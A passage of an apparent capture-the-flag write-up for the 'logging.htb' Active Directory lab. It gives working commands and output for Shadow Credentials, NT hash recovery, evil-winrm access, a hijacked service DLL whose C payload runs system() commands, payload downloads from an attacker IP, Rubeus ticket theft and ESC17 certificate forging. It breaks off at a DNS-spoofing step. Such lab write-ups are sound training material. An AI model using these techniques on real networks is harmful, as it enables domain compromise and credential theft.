+<p>This is the key finding: <code>svc_recovery</code> effectively has <code>GenericWrite</code> over the <code>msa_health$</code> managed service account, including write access to <code>msDS-KeyCredentialLink</code>. That attribute is exactly what the Shadow Credentials attack targets. We add a key credential to the account:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime -f <span class="string">&#x27;+25200&#x27;</span> bloodyAD -d logging.htb --host dc01.logging.htb -k add shadowCredentials <span class="string">&#x27;msa_health$&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] KeyCredential generated with following sha256 of RSA key: 0c63433f3fd63c28bef008f40a552ba0d32591bb3a84bdf829ec8be70a208814</span><br><span class="line">[+] Saved PEM certificate at path: N0FlhS0d_cert.pem</span><br><span class="line">[+] Saved PEM private key at path: N0FlhS0d_priv.pem</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we can authenticate as <code>msa_health$</code> using that certificate. We first bundle it into a PFX:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -<span class="built_in">export</span> -out msa_health.pfx -inkey N0FlhS0d_priv.pem -<span class="keyword">in</span> N0FlhS0d_cert.pem -passout pass:</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we use PKINITtools to request a TGT via PKINIT, which conveniently prints the AS-REP encryption key we’ll need in a moment:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">faketime -f <span class="string">&#x27;+25200&#x27;</span> python3 /tmp/PKINITtools/gettgtpkinit.py \</span><br><span class="line">  -cert-pem N0FlhS0d_cert.pem -key-pem N0FlhS0d_priv.pem \</span><br><span class="line">  -dc-ip 10.129.36.116 <span class="string">&#x27;logging.htb/msa_health$&#x27;</span> msa_health.ccache</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INFO:minikerberos:Loading certificate and key from file</span><br><span class="line">INFO:minikerberos:Requesting TGT</span><br><span class="line">INFO:minikerberos:AS-REP encryption key (you might need this later):</span><br><span class="line">INFO:minikerberos:98a21bdbbf06adcfacd4f246408f8246b79ab125621f0e4b7abae435e24f367c</span><br><span class="line">INFO:minikerberos:Saved TGT to file</span><br></pre></td></tr></table></figure></div>
+
+<p>Feeding that AS-REP key back into <code>getnthash.py</code> recovers the account’s NT hash:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=msa_health.ccache</span><br><span class="line">faketime -f <span class="string">&#x27;+25200&#x27;</span> python3 /tmp/PKINITtools/getnthash.py \</span><br><span class="line">  -key 98a21bdbbf06adcfacd4f246408f8246b79ab125621f0e4b7abae435e24f367c \</span><br><span class="line">  -dc-ip 10.129.36.116 <span class="string">&#x27;logging.htb/msa_health$&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line">603fc24ee01a9409f83c9d1d701485c5</span><br></pre></td></tr></table></figure></div>
+
+<p><code>msa_health$</code> is a member of the Remote Management Users group, so its NT hash gets us a WinRM shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u <span class="string">&#x27;msa_health$&#x27;</span> -H 603fc24ee01a9409f83c9d1d701485c5 -i dc01.logging.htb</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\msa_health$\Documents&gt; whoami</span><br><span class="line">logging\msa_health$</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\msa_health$\Documents&gt; dir C:\Users</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        4/16/2026   5:27 PM                .NET v4.5</span><br><span class="line">d-----        4/16/2026   5:27 PM                .NET v4.5 Classic</span><br><span class="line">d-----        4/16/2026   8:30 PM                Administrator</span><br><span class="line">d-----        4/16/2026   4:41 PM                jaylee.clifton</span><br><span class="line">d-----        4/17/2026   8:33 AM                msa_health$</span><br><span class="line">d-r---        4/10/2020  10:49 AM                Public</span><br><span class="line">d-----        4/17/2026   1:47 PM                toby.brynleigh</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-2-DLL-Hijacking-User-Flag"><a href="#Privilege-Escalation-2-DLL-Hijacking-User-Flag" class="headerlink" title="Privilege Escalation #2 - DLL Hijacking (User Flag)"></a>Privilege Escalation #2 - DLL Hijacking (User Flag)</h2><p>Poking around <code>C:\Program Files\</code> we find a custom <code>UpdateMonitor</code> .NET application:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">dir</span> <span class="string">&quot;C:\Program Files\UpdateMonitor\&quot;</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\UpdateMonitor</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">4</span>/<span class="number">23</span>/<span class="number">2026</span>   <span class="number">4</span>:<span class="number">11</span> AM                bin</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">4</span>/<span class="number">16</span>/<span class="number">2026</span>   <span class="number">4</span>:<span class="number">10</span> PM                packages</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2</span>/<span class="number">21</span>/<span class="number">2026</span>   <span class="number">3</span>:<span class="number">52</span> PM            <span class="number">189</span> App.config</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2</span>/<span class="number">21</span>/<span class="number">2026</span>   <span class="number">3</span>:<span class="number">52</span> PM            <span class="number">157</span> packages.config</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">4</span>/<span class="number">9</span>/<span class="number">2026</span>  <span class="number">10</span>:<span class="number">31</span> PM           <span class="number">8192</span> UpdateMonitor.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Its log file tells us exactly how it behaves:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">type</span> C:\ProgramData\UpdateMonitor\Logs\monitor.log | <span class="built_in">Select-Object</span> <span class="literal">-Last</span> <span class="number">10</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[2026-04-23 04:53:15] Starting Sentinel Update Check...</span><br><span class="line">[2026-04-23 04:53:15] Checking for update on core server...</span><br><span class="line">[2026-04-23 04:53:15] Info: Core did not find file Settings_Update.zip</span><br><span class="line">[2026-04-23 04:53:15] Last status: File not found on core</span><br><span class="line">[2026-04-23 04:53:15] Checking for update on local server...</span><br><span class="line">[2026-04-23 04:53:15] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.</span><br><span class="line">[2026-04-23 04:53:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll</span><br><span class="line">[2026-04-23 04:53:15] Failed to load settings_update.dll. Error code: 126</span><br><span class="line">[2026-04-23 04:53:15] Update check completed.</span><br></pre></td></tr></table></figure></div>
+
+<p>Reading between the lines, the service runs on a <strong>3-minute</strong> cycle, it looks for <code>Settings_Update.zip</code> in <code>C:\ProgramData\UpdateMonitor\</code>, extracts it into <code>C:\Program Files\UpdateMonitor\bin\</code>, and then loads <code>settings_update.dll</code> via <code>LoadLibrary</code> (calling <code>PreUpdateCheck</code> if present). Crucially, the <code>C:\ProgramData\UpdateMonitor\</code> path is writable by <code>msa_health$</code>, which means we control the DLL that gets loaded.</p>
+<p>We write a small C DLL whose <code>DllMain</code> runs a batch of enumeration commands as whatever user loads it, dropping the output to a world-readable file:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil3.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;whoami &gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;type C:\\Users\\jaylee.clifton\\Desktop\\user.txt &gt;&gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;net user jaylee.clifton &gt;&gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;net localgroup Administrators &gt;&gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;whoami /groups &gt;&gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;dir C:\\Users\\jaylee.clifton\\Documents\\ /s &gt;&gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;type C:\\Users\\jaylee.clifton\\Documents\\Tickets\\*.html &gt;&gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer &gt;&gt; C:\\ProgramData\\UpdateMonitor\\out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;icacls C:\\ProgramData\\UpdateMonitor\\out.txt /grant Everyone:F &gt;nul 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>We cross-compile it as a 32-bit DLL and pack it into the zip the service expects:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-gcc -shared -m32 -o settings_update.dll evil3.c -Wl,--subsystem,windows</span><br><span class="line">zip Settings_Update.zip settings_update.dll</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we host the zip over HTTP and pull it down into the watched directory from our WinRM session:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">curl</span> http://<span class="number">10.10</span>.<span class="number">16.91</span>:<span class="number">8888</span>/Settings_Update.zip <span class="literal">-o</span> C:\ProgramData\UpdateMonitor\Settings_Update.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>After roughly three minutes the service picks up the zip, extracts the DLL and loads it. The log confirms the load happened (the missing <code>PreUpdateCheck</code> export is fine, <code>DllMain</code> already fired):</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[2026-04-23 04:56:15] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\</span><br><span class="line">[2026-04-23 04:56:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll</span><br><span class="line">[2026-04-23 04:56:16] &#x27;PreUpdateCheck&#x27; not found in settings_update.dll. Continuing...</span><br><span class="line">[2026-04-23 04:56:16] Update check completed.</span><br></pre></td></tr></table></figure></div>
+
+<p>The DLL executed in the context of <code>jaylee.clifton</code>, so we read back our loot file:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">type</span> C:\ProgramData\UpdateMonitor\out.txt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logging\jaylee.clifton</span><br><span class="line">d394539b6958154d06285fc93707d7cf</span><br><span class="line">User name                    jaylee.clifton</span><br><span class="line">...</span><br><span class="line">Global Group memberships     *Domain Users         *IT</span><br><span class="line">...</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate</span><br><span class="line">    WUServer    REG_SZ    https://wsus.logging.htb:8531</span><br></pre></td></tr></table></figure></div>
+
+<p>Beyond the <strong>user flag</strong> (<code>d394539b6958154d06285fc93707d7cf</code>), this dump hands us the map for the rest of the box: <code>jaylee.clifton</code> belongs to the <strong>IT</strong> group, WSUS lives at <code>https://wsus.logging.htb:8531</code>, and there’s an incident ticket at <code>C:\Users\jaylee.clifton\Documents\Tickets\Incident_4922_WSUS_Remediation_ViewExport.html</code> describing a <code>ForceSync</code> scheduled task that fires every <strong>120 seconds</strong> to restart the WSUS client. All three pieces feed directly into the root path.</p>
+<h2 id="Privilege-Escalation-3-ADCS-ESC17-WSUS-Abuse-Root-Flag"><a href="#Privilege-Escalation-3-ADCS-ESC17-WSUS-Abuse-Root-Flag" class="headerlink" title="Privilege Escalation #3 - ADCS ESC17 + WSUS Abuse (Root Flag)"></a>Privilege Escalation #3 - ADCS ESC17 + WSUS Abuse (Root Flag)</h2><h3 id="Obtaining-jaylee-clifton’s-TGT-via-Rubeus"><a href="#Obtaining-jaylee-clifton’s-TGT-via-Rubeus" class="headerlink" title="Obtaining jaylee.clifton’s TGT via Rubeus"></a>Obtaining jaylee.clifton’s TGT via Rubeus</h3><p>To move from code execution to real control of <code>jaylee.clifton</code>, we reuse the same DLL-hijack primitive, this time to run Rubeus and dump her TGT with <code>tgtdeleg</code>:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil_rubeus.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;C:\\ProgramData\\UpdateMonitor\\Rubeus.exe tgtdeleg /nowrap &gt; C:\\ProgramData\\UpdateMonitor\\rubeus_out.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;icacls C:\\ProgramData\\UpdateMonitor\\rubeus_out.txt /grant Everyone:F &gt;nul 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Same build and packaging as before, and we upload both the DLL zip and Rubeus:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-gcc -shared -m32 -o settings_update.dll evil_rubeus.c -Wl,--subsystem,windows</span><br><span class="line">zip Settings_Update.zip settings_update.dll</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">curl</span> http://<span class="number">10.10</span>.<span class="number">16.91</span>:<span class="number">8888</span>/Rubeus.exe <span class="literal">-o</span> C:\ProgramData\UpdateMonitor\Rubeus.exe</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">curl</span> http://<span class="number">10.10</span>.<span class="number">16.91</span>:<span class="number">8888</span>/Settings_Update.zip <span class="literal">-o</span> C:\ProgramData\UpdateMonitor\Settings_Update.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>One cycle later we grab the base64 kirbi ticket that Rubeus captured:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span>&gt; <span class="built_in">type</span> C:\ProgramData\UpdateMonitor\rubeus_out.txt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.3.3</span><br><span class="line"></span><br><span class="line">[*] Action: Request Fake Delegation TGT (current user)</span><br><span class="line">[*] No target SPN specified, attempting to build &#x27;cifs/dc.domain.com&#x27;</span><br><span class="line">[*] Initializing Kerberos GSS-API w/ fake delegation for target &#x27;cifs/DC01.logging.htb&#x27;</span><br><span class="line">[+] Kerberos GSS-API initialization success!</span><br><span class="line">[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.</span><br><span class="line">[*] Found the AP-REQ delegation ticket in the GSS-API output.</span><br><span class="line">[*] Authenticator etype: aes256_cts_hmac_sha1</span><br><span class="line">[+] Successfully decrypted the authenticator</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFyDCCBcSgAwIBBaEDAgEWooIE....&lt;base64 ticket&gt;....</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Converting-the-Ticket-and-Getting-jaylee’s-NT-Hash"><a href="#Converting-the-Ticket-and-Getting-jaylee’s-NT-Hash" class="headerlink" title="Converting the Ticket and Getting jaylee’s NT Hash"></a>Converting the Ticket and Getting jaylee’s NT Hash</h3><p>We decode the kirbi blob and convert it into a ccache we can use with Impacket and certipy:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;base64_ticket&gt;&#x27;</span> | <span class="built_in">base64</span> -d &gt; jaylee.kirbi</span><br><span class="line">impacket-ticketConverter jaylee.kirbi jaylee.ccache</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] done</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=jaylee.ccache</span><br><span class="line">klist</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ticket cache: FILE:/home/kali/logging/jaylee.ccache</span><br><span class="line">Default principal: jaylee.clifton@LOGGING.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">04/23/2026 04:59:15  04/23/2026 14:59:15  krbtgt/LOGGING.HTB@LOGGING.HTB</span><br></pre></td></tr></table></figure></div>
+
+<p>With jaylee’s TGT loaded, we request a certificate for her from the default template over Kerberos, then use that certificate to pull her NT hash via UnPAC-the-hash:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=jaylee.ccache</span><br><span class="line">faketime -f <span class="string">&#x27;+25200&#x27;</span> certipy-ad req -target dc01.logging.htb -dc-host dc01.logging.htb -k -no-pass -ca logging-DC01-CA</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 7</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN &#x27;jaylee.clifton@logging.htb&#x27;</span><br><span class="line">[*] Saving certificate and private key to &#x27;jaylee.clifton.pfx&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime -f <span class="string">&#x27;+25200&#x27;</span> certipy-ad auth -dc-ip 10.129.36.116 -pfx jaylee.clifton.pfx</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Using principal: &#x27;jaylee.clifton@logging.htb&#x27;</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;jaylee.clifton&#x27;</span><br><span class="line">[*] Got hash for &#x27;jaylee.clifton@logging.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:1abff5519c569c11dc713706b4a15ae0</span><br></pre></td></tr></table></figure></div>
+
+<p>That leaves us with jaylee’s NT hash <code>1abff5519c569c11dc713706b4a15ae0</code>, which we can now use for the ADCS abuse without depending on the flaky ticket.</p>
+<h3 id="ESC17-Requesting-a-Certificate-for-wsus-logging-htb"><a href="#ESC17-Requesting-a-Certificate-for-wsus-logging-htb" class="headerlink" title="ESC17 - Requesting a Certificate for wsus.logging.htb"></a>ESC17 - Requesting a Certificate for wsus.logging.htb</h3><p>The <code>UpdateSrv</code> template on this CA is vulnerable to ESC17. It lets the enrollee supply the subject (so we can set an arbitrary SAN), it has the Server Authentication EKU (so the resulting cert is valid for TLS), the <strong>IT</strong> group (which jaylee belongs to) has enrollment rights, and there’s no manager approval so certificates issue automatically. That combination lets us mint a TLS certificate for a hostname we don’t own, <code>wsus.logging.htb</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">faketime -f <span class="string">&#x27;+25200&#x27;</span> certipy-ad req -u jaylee.clifton@logging.htb \</span><br><span class="line">  -hashes :1abff5519c569c11dc713706b4a15ae0 \</span><br><span class="line">  -ca logging-DC01-CA -template UpdateSrv \</span><br><span class="line">  -dns wsus.logging.htb -dc-ip 10.129.36.116</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 8</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with DNS Host Name &#x27;wsus.logging.htb&#x27;</span><br><span class="line">[*] Saving certificate and private key to &#x27;wsus.pfx&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>We split the PFX into a certificate and key and concatenate them into a single PEM that <code>wsuks</code> can consume:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad cert -pfx wsus.pfx -nokey -out wsus.crt</span><br><span class="line">certipy-ad cert -pfx wsus.pfx -nocert -out wsus.key</span><br><span class="line"><span class="built_in">cat</span> wsus.crt wsus.key &gt; wsus.pem</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="DNS-Record-Manipulation"><a href="#DNS-Record-Manipulation" class="headerlink" title="DNS Record Manipulation"></a>DNS Record Manipulation</h3><p>Having a valid certificate for <code>wsus.logging.htb</code> is only half the impersonation, we also need the DC to resolve that hostname to us. Since the DC runs an AD-integrated DNS zone that authenticated users can update, we drop yet another DLL that runs <code>Invoke-DNSUpdate.ps1</code> to add an A record pointing <code>wsus.logging.htb</code> at our attacker IP:</p>
